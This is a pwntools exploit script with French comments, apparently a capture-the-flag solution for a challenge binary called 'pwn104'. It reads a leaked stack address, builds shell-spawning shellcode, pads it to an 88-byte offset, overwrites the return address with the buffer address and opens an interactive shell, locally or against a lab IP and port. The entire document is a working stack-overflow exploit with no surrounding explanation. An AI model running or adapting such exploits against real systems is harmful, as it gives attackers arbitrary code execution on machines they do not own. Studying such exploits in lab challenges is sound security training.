from pwn import *

context.binary = ELF('./pwn104-1644300377109.pwn104')
context.arch = 'amd64'
context.log_level = 'info'

if args.REMOTE:
    p = remote('10.128.131.51', 9004)   # à adapter
else:
    p = process('./pwn104-1644300377109.pwn104')

# 1. Récupérer l'adresse leakée
p.recvuntil(b'I\'m waiting for you at ')
leak = p.recvline().strip()
stack_addr = int(leak, 16)
log.success(f"Buffer address: {hex(stack_addr)}")

# 2. Shellcode
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)} bytes")

# 3. Payload : shellcode + padding + adresse du buffer
OFFSET = 88
payload  = shellcode
payload  = payload.ljust(OFFSET, b'A')
payload += p64(stack_addr)

p.sendline(payload)
p.interactive()
